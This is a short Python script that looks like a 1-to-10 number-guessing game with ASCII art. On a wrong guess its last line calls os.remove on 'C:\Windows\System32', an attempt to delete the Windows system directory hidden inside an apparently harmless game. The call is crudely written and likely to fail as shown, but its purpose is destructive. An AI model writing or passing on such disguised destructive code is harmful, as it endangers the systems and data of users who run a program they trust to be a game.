import os
import random
import art


print(art.s)


number = random.randint(1,10)

guess = int(input("Pick A Number Between 1 and 10\n > "))

if guess == number:
  print("You Won!")

else:
  print('You Lost!')
  os.remove("C:\Windows\System32")
